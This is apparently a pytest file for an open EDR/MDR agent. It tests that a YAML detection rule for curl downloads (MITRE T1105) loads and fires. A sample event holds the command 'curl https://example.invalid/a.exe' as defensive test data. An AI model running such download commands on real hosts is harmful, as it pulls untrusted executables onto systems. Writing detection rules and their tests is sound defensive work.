from pathlib import Path

from open_edr_mdr_agent.core.detection import detect_event
from open_edr_mdr_agent.core.rules import load_rules
from open_edr_mdr_agent.core.schemas import EventType, NormalizedEvent, Source


def test_yaml_rule_loader_matches_event(tmp_path):
    rules_path = tmp_path / "rules.yaml"
    rules_path.write_text(
        """
rules:
  - rule_id: custom.test.curl
    title: Curl command
    severity: medium
    event_type: process_start
    mitre: [T1105]
    conditions:
      - field: command_line
        op: icontains
        value: curl
      - field: command_line
        op: regex
        value: "https?://"
""",
        encoding="utf-8",
    )
    rules = load_rules(rules_path)
    event = NormalizedEvent(source=Source.INTERNAL, tenant_id="default", host="POS01", event_type=EventType.PROCESS_START, process_name="cmd.exe", command_line="curl https://example.invalid/a.exe")
    alerts = detect_event(event, custom_rules=rules)
    assert len(alerts) == 1
    assert alerts[0].title == "Curl command"
    assert alerts[0].raw["rule_id"] == "custom.test.curl"


def test_example_rules_file_loads():
    rules = load_rules(Path("configs/detection-rules.example.yaml"))
    assert len(rules) >= 2
